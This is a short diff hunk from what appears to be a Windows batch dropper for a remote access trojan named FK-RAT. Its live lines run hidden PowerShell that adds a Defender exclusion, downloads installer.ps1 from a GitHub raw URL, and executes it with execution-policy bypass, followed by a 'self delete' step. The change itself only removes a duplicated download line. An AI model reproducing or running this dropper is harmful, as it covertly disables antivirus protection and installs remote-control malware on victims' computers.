@@ -37,7 +37,6 @@ powershell powershell.exe -windowstyle hidden -c "Add-MpPreference -ExclusionPat
 
 REM rat resources
 powershell powershell.exe -windowstyle hidden -c "Invoke-WebRequest -URI https://raw.githubusercontent.com/Sunnickel/FK-RAT/main/files/installer.ps1 -OutFile installer.ps1";
-powershell powershell.exe -windowstyle hidden -c "Invoke-WebRequest -URI https://raw.githubusercontent.com/Sunnickel/FK-RAT/main/files/installer.ps1 -OutFile installer.ps1";
 powershell -windowstyle hidden -ep bypass ./installer.ps1
 
 REM self delete
